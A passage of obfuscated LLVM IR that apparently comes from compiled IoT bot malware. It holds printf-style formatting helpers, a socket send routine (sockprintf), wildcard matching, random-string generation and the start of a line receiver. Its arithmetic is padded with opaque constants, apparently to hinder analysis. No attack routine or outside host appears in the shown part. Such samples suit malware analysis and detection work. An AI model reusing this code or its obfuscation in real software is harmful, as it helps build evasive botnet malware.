  %236 = sub i32 %235, -1847183624
  %237 = add i32 %236, %234
  %238 = add i32 %237, -1847183624
  %239 = add nsw i32 %235, %234
  store i32 %238, i32* %9, align 4
  br label %329

; <label>:240:                                    ; preds = %204
  %241 = load i8*, i8** %5, align 8
  %242 = load i8, i8* %241, align 1
  %243 = zext i8 %242 to i32
  %244 = icmp eq i32 %243, 117
  br i1 %244, label %245, label %275

; <label>:245:                                    ; preds = %240
  %246 = load i8**, i8*** %4, align 8
  %247 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %248 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %247, i32 0, i32 0
  %249 = load i32, i32* %248, align 8
  %250 = icmp ule i32 %249, 40
  br i1 %250, label %251, label %260

; <label>:251:                                    ; preds = %245
  %252 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %247, i32 0, i32 3
  %253 = load i8*, i8** %252, align 8
  %254 = getelementptr i8, i8* %253, i32 %249
  %255 = bitcast i8* %254 to i32*
  %256 = sub i32 %249, 1401806841
  %257 = add i32 %256, 8
  %258 = add i32 %257, 1401806841
  %259 = add i32 %249, 8
  store i32 %258, i32* %248, align 8
  br label %265

; <label>:260:                                    ; preds = %245
  %261 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %247, i32 0, i32 2
  %262 = load i8*, i8** %261, align 8
  %263 = bitcast i8* %262 to i32*
  %264 = getelementptr i8, i8* %262, i32 8
  store i8* %264, i8** %261, align 8
  br label %265

; <label>:265:                                    ; preds = %260, %251
  %266 = phi i32* [ %255, %251 ], [ %263, %260 ]
  %267 = load i32, i32* %266, align 4
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @printi(i8** %246, i32 %267, i32 10, i32 0, i32 %268, i32 %269, i32 97)
  %271 = load i32, i32* %9, align 4
  %272 = sub i32 0, %270
  %273 = sub i32 %271, %272
  %274 = add nsw i32 %271, %270
  store i32 %273, i32* %9, align 4
  br label %329

; <label>:275:                                    ; preds = %240
  %276 = load i8*, i8** %5, align 8
  %277 = load i8, i8* %276, align 1
  %278 = zext i8 %277 to i32
  %279 = icmp eq i32 %278, 99
  br i1 %279, label %280, label %315

; <label>:280:                                    ; preds = %275
  %281 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %282 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 8
  %284 = icmp ule i32 %283, 40
  br i1 %284, label %285, label %294

; <label>:285:                                    ; preds = %280
  %286 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %281, i32 0, i32 3
  %287 = load i8*, i8** %286, align 8
  %288 = getelementptr i8, i8* %287, i32 %283
  %289 = bitcast i8* %288 to i32*
  %290 = sub i32 %283, 334505609
  %291 = add i32 %290, 8
  %292 = add i32 %291, 334505609
  %293 = add i32 %283, 8
  store i32 %292, i32* %282, align 8
  br label %299

; <label>:294:                                    ; preds = %280
  %295 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %281, i32 0, i32 2
  %296 = load i8*, i8** %295, align 8
  %297 = bitcast i8* %296 to i32*
  %298 = getelementptr i8, i8* %296, i32 8
  store i8* %298, i8** %295, align 8
  br label %299

; <label>:299:                                    ; preds = %294, %285
  %300 = phi i32* [ %289, %285 ], [ %297, %294 ]
  %301 = load i32, i32* %300, align 4
  %302 = trunc i32 %301 to i8
  %303 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %302, i8* %303, align 1
  %304 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %304, align 1
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %307 = load i32, i32* %7, align 4
  %308 = load i32, i32* %8, align 4
  %309 = call i32 @prints(i8** %305, i8* %306, i32 %307, i32 %308)
  %310 = load i32, i32* %9, align 4
  %311 = add i32 %310, -238866725
  %312 = add i32 %311, %309
  %313 = sub i32 %312, -238866725
  %314 = add nsw i32 %310, %309
  store i32 %313, i32* %9, align 4
  br label %329

; <label>:315:                                    ; preds = %275
  br label %328

; <label>:316:                                    ; preds = %17
  br label %317

; <label>:317:                                    ; preds = %316, %35
  %318 = load i8**, i8*** %4, align 8
  %319 = load i8*, i8** %5, align 8
  %320 = load i8, i8* %319, align 1
  %321 = zext i8 %320 to i32
  call void @printchar(i8** %318, i32 %321)
  %322 = load i32, i32* %9, align 4
  %323 = sub i32 0, %322
  %324 = sub i32 0, 1
  %325 = add i32 %323, %324
  %326 = sub i32 0, %325
  %327 = add nsw i32 %322, 1
  store i32 %326, i32* %9, align 4
  br label %328

; <label>:328:                                    ; preds = %317, %315
  br label %329

; <label>:329:                                    ; preds = %328, %299, %265, %229, %193, %159, %124
  %330 = load i8*, i8** %5, align 8
  %331 = getelementptr inbounds i8, i8* %330, i32 1
  store i8* %331, i8** %5, align 8
  br label %12

; <label>:332:                                    ; preds = %29, %12
  %333 = load i8**, i8*** %4, align 8
  %334 = icmp ne i8** %333, null
  br i1 %334, label %335, label %338

; <label>:335:                                    ; preds = %332
  %336 = load i8**, i8*** %4, align 8
  %337 = load i8*, i8** %336, align 8
  store i8 0, i8* %337, align 1
  br label %338

; <label>:338:                                    ; preds = %335, %332
  %339 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %340 = bitcast %struct.__va_list_tag* %339 to i8*
  call void @llvm.va_end(i8* %340)
  %341 = load i32, i32* %9, align 4
  ret i32 %341
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %51

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %30

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 %22, -916804485
  %24 = add i32 %23, 1
  %25 = add i32 %24, -916804485
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %11, align 4
  br label %27

; <label>:27:                                     ; preds = %21
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %12, align 8
  br label %17

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* %7, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  store i32 0, i32* %7, align 4
  br label %42

; <label>:35:                                     ; preds = %30
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = add i32 %37, -418712952
  %39 = sub i32 %38, %36
  %40 = sub i32 %39, -418712952
  %41 = sub nsw i32 %37, %36
  store i32 %40, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %35, %34
  %43 = load i32, i32* %8, align 4
  %44 = xor i32 2, -1
  %45 = xor i32 %43, %44
  %46 = and i32 %45, %43
  %47 = and i32 %43, 2
  %48 = icmp ne i32 %46, 0
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %42
  store i32 48, i32* %10, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %42
  br label %51

; <label>:51:                                     ; preds = %50, %4
  %52 = load i32, i32* %8, align 4
  %53 = xor i32 %52, -1
  %54 = xor i32 1, -1
  %55 = xor i32 1674018669, -1
  %56 = or i32 %53, %54
  %57 = or i32 1674018669, %55
  %58 = xor i32 %56, -1
  %59 = and i32 %58, %57
  %60 = and i32 %52, 1
  %61 = icmp ne i32 %59, 0
  br i1 %61, label %82, label %62

; <label>:62:                                     ; preds = %51
  br label %63

; <label>:63:                                     ; preds = %74, %62
  %64 = load i32, i32* %7, align 4
  %65 = icmp sgt i32 %64, 0
  br i1 %65, label %66, label %81

; <label>:66:                                     ; preds = %63
  %67 = load i8**, i8*** %5, align 8
  %68 = load i32, i32* %10, align 4
  call void @printchar(i8** %67, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add i32 %69, -1617956006
  %71 = add i32 %70, 1
  %72 = sub i32 %71, -1617956006
  %73 = add nsw i32 %69, 1
  store i32 %72, i32* %9, align 4
  br label %74

; <label>:74:                                     ; preds = %66
  %75 = load i32, i32* %7, align 4
  %76 = sub i32 0, %75
  %77 = sub i32 0, -1
  %78 = add i32 %76, %77
  %79 = sub i32 0, %78
  %80 = add nsw i32 %75, -1
  store i32 %79, i32* %7, align 4
  br label %63

; <label>:81:                                     ; preds = %63
  br label %82

; <label>:82:                                     ; preds = %81, %51
  br label %83

; <label>:83:                                     ; preds = %96, %82
  %84 = load i8*, i8** %6, align 8
  %85 = load i8, i8* %84, align 1
  %86 = icmp ne i8 %85, 0
  br i1 %86, label %87, label %99

; <label>:87:                                     ; preds = %83
  %88 = load i8**, i8*** %5, align 8
  %89 = load i8*, i8** %6, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  call void @printchar(i8** %88, i32 %91)
  %92 = load i32, i32* %9, align 4
  %93 = sub i32 0, 1
  %94 = sub i32 %92, %93
  %95 = add nsw i32 %92, 1
  store i32 %94, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %87
  %97 = load i8*, i8** %6, align 8
  %98 = getelementptr inbounds i8, i8* %97, i32 1
  store i8* %98, i8** %6, align 8
  br label %83

; <label>:99:                                     ; preds = %83
  br label %100

; <label>:100:                                    ; preds = %110, %99
  %101 = load i32, i32* %7, align 4
  %102 = icmp sgt i32 %101, 0
  br i1 %102, label %103, label %116

; <label>:103:                                    ; preds = %100
  %104 = load i8**, i8*** %5, align 8
  %105 = load i32, i32* %10, align 4
  call void @printchar(i8** %104, i32 %105)
  %106 = load i32, i32* %9, align 4
  %107 = sub i32 0, 1
  %108 = sub i32 %106, %107
  %109 = add nsw i32 %106, 1
  store i32 %108, i32* %9, align 4
  br label %110

; <label>:110:                                    ; preds = %103
  %111 = load i32, i32* %7, align 4
  %112 = sub i32 %111, 939054198
  %113 = add i32 %112, -1
  %114 = add i32 %113, 939054198
  %115 = add nsw i32 %111, -1
  store i32 %114, i32* %7, align 4
  br label %100

; <label>:116:                                    ; preds = %100
  %117 = load i32, i32* %9, align 4
  ret i32 %117
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %128

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %48

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %48

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = add i32 0, 1202838039
  %45 = sub i32 %44, %43
  %46 = sub i32 %45, 1202838039
  %47 = sub nsw i32 0, %43
  store i32 %46, i32* %21, align 4
  br label %48

; <label>:48:                                     ; preds = %42, %39, %36, %33
  %49 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 12
  %51 = getelementptr inbounds i8, i8* %50, i64 -1
  store i8* %51, i8** %17, align 8
  %52 = load i8*, i8** %17, align 8
  store i8 0, i8* %52, align 1
  br label %53

; <label>:53:                                     ; preds = %77, %48
  %54 = load i32, i32* %21, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %89

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* %21, align 4
  %58 = load i32, i32* %11, align 4
  %59 = urem i32 %57, %58
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %18, align 4
  %61 = icmp sge i32 %60, 10
  br i1 %61, label %62, label %77

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* %15, align 4
  %64 = sub i32 %63, 389343686
  %65 = sub i32 %64, 48
  %66 = add i32 %65, 389343686
  %67 = sub nsw i32 %63, 48
  %68 = sub i32 0, 10
  %69 = add i32 %66, %68
  %70 = sub nsw i32 %66, 10
  %71 = load i32, i32* %18, align 4
  %72 = sub i32 0, %71
  %73 = sub i32 0, %69
  %74 = add i32 %72, %73
  %75 = sub i32 0, %74
  %76 = add nsw i32 %71, %69
  store i32 %75, i32* %18, align 4
  br label %77

; <label>:77:                                     ; preds = %62, %56
  %78 = load i32, i32* %18, align 4
  %79 = sub i32 %78, 1554317214
  %80 = add i32 %79, 48
  %81 = add i32 %80, 1554317214
  %82 = add nsw i32 %78, 48
  %83 = trunc i32 %81 to i8
  %84 = load i8*, i8** %17, align 8
  %85 = getelementptr inbounds i8, i8* %84, i32 -1
  store i8* %85, i8** %17, align 8
  store i8 %83, i8* %85, align 1
  %86 = load i32, i32* %11, align 4
  %87 = load i32, i32* %21, align 4
  %88 = udiv i32 %87, %86
  store i32 %88, i32* %21, align 4
  br label %53

; <label>:89:                                     ; preds = %53
  %90 = load i32, i32* %19, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %118

; <label>:92:                                     ; preds = %89
  %93 = load i32, i32* %13, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %114

; <label>:95:                                     ; preds = %92
  %96 = load i32, i32* %14, align 4
  %97 = xor i32 2, -1
  %98 = xor i32 %96, %97
  %99 = and i32 %98, %96
  %100 = and i32 %96, 2
  %101 = icmp ne i32 %99, 0
  br i1 %101, label %102, label %114

; <label>:102:                                    ; preds = %95
  %103 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %103, i32 45)
  %104 = load i32, i32* %20, align 4
  %105 = sub i32 0, 1
  %106 = sub i32 %104, %105
  %107 = add nsw i32 %104, 1
  store i32 %106, i32* %20, align 4
  %108 = load i32, i32* %13, align 4
  %109 = sub i32 0, %108
  %110 = sub i32 0, -1
  %111 = add i32 %109, %110
  %112 = sub i32 0, %111
  %113 = add nsw i32 %108, -1
  store i32 %112, i32* %13, align 4
  br label %117

; <label>:114:                                    ; preds = %95, %92
  %115 = load i8*, i8** %17, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 -1
  store i8* %116, i8** %17, align 8
  store i8 45, i8* %116, align 1
  br label %117

; <label>:117:                                    ; preds = %114, %102
  br label %118

; <label>:118:                                    ; preds = %117, %89
  %119 = load i32, i32* %20, align 4
  %120 = load i8**, i8*** %9, align 8
  %121 = load i8*, i8** %17, align 8
  %122 = load i32, i32* %13, align 4
  %123 = load i32, i32* %14, align 4
  %124 = call i32 @prints(i8** %120, i8* %121, i32 %122, i32 %123)
  %125 = sub i32 0, %124
  %126 = sub i32 %119, %125
  %127 = add nsw i32 %119, %124
  store i32 %126, i32* %8, align 4
  br label %128

; <label>:128:                                    ; preds = %118, %25
  %129 = load i32, i32* %8, align 4
  ret i32 %129
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.485, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %84 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %52
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %126

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %38

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %36

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = or i1 %31, %33
  %35 = xor i1 %29, true
  br label %36

; <label>:36:                                     ; preds = %24, %19
  %37 = phi i1 [ false, %19 ], [ %34, %24 ]
  br label %38

; <label>:38:                                     ; preds = %36, %13
  %39 = phi i1 [ true, %13 ], [ %37, %36 ]
  %40 = xor i1 %39, true
  %41 = and i1 true, %40
  %42 = xor i1 true, true
  %43 = and i1 %39, %42
  %44 = xor i1 true, true
  %45 = and i1 %44, true
  %46 = and i1 true, %42
  %47 = or i1 %41, %43
  %48 = or i1 %45, %46
  %49 = xor i1 %47, %48
  %50 = xor i1 %39, true
  %51 = zext i1 %49 to i32
  store i32 %51, i32* %3, align 4
  br label %126

; <label>:52:                                     ; preds = %2
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %70

; <label>:57:                                     ; preds = %52
  %58 = load i8*, i8** %4, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 1
  %60 = load i8*, i8** %5, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 1
  %62 = call i32 @wildString(i8* %59, i8* %61)
  %63 = icmp ne i32 %62, 0
  %64 = xor i1 %63, true
  %65 = and i1 true, %64
  %66 = xor i1 true, true
  %67 = and i1 %63, %66
  %68 = or i1 %65, %67
  %69 = xor i1 %63, true
  br label %70

; <label>:70:                                     ; preds = %57, %52
  %71 = phi i1 [ false, %52 ], [ %68, %57 ]
  %72 = xor i1 %71, true
  %73 = and i1 true, %72
  %74 = xor i1 true, true
  %75 = and i1 %71, %74
  %76 = xor i1 true, true
  %77 = and i1 %76, true
  %78 = and i1 true, %74
  %79 = or i1 %73, %75
  %80 = or i1 %77, %78
  %81 = xor i1 %79, %80
  %82 = xor i1 %71, true
  %83 = zext i1 %81 to i32
  store i32 %83, i32* %3, align 4
  br label %126

; <label>:84:                                     ; preds = %2
  %85 = load i8*, i8** %4, align 8
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = call i32 @toupper(i32 %87) #9
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = call i32 @toupper(i32 %91) #9
  %93 = icmp eq i32 %88, %92
  br i1 %93, label %94, label %112

; <label>:94:                                     ; preds = %84
  %95 = load i8*, i8** %4, align 8
  %96 = getelementptr inbounds i8, i8* %95, i64 1
  %97 = load i8*, i8** %5, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 1
  %99 = call i32 @wildString(i8* %96, i8* %98)
  %100 = icmp ne i32 %99, 0
  %101 = xor i1 %100, true
  %102 = and i1 true, %101
  %103 = xor i1 true, true
  %104 = and i1 %100, %103
  %105 = xor i1 true, true
  %106 = and i1 %105, true
  %107 = and i1 true, %103
  %108 = or i1 %102, %104
  %109 = or i1 %106, %107
  %110 = xor i1 %108, %109
  %111 = xor i1 %100, true
  br label %112

; <label>:112:                                    ; preds = %94, %84
  %113 = phi i1 [ false, %84 ], [ %110, %94 ]
  %114 = xor i1 %113, true
  %115 = and i1 true, %114
  %116 = xor i1 true, true
  %117 = and i1 %113, %116
  %118 = xor i1 true, true
  %119 = and i1 %118, true
  %120 = and i1 true, %116
  %121 = or i1 %115, %117
  %122 = or i1 %119, %120
  %123 = xor i1 %121, %122
  %124 = xor i1 %113, true
  %125 = zext i1 %123 to i32
  store i32 %125, i32* %3, align 4
  br label %126

; <label>:126:                                    ; preds = %112, %70, %38, %9
  %127 = load i32, i32* %3, align 4
  ret i32 %127
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %21, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %27

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 0, 65
  %14 = sub i32 %12, %13
  %15 = add i32 %12, 65
  %16 = trunc i32 %14 to i8
  %17 = load i8*, i8** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  store i8 %16, i8* %20, align 1
  br label %21

; <label>:21:                                     ; preds = %10
  %22 = load i32, i32* %5, align 4
  %23 = add i32 %22, 121732490
  %24 = add i32 %23, 1
  %25 = sub i32 %24, 121732490
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %5, align 4
  br label %6

; <label>:27:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
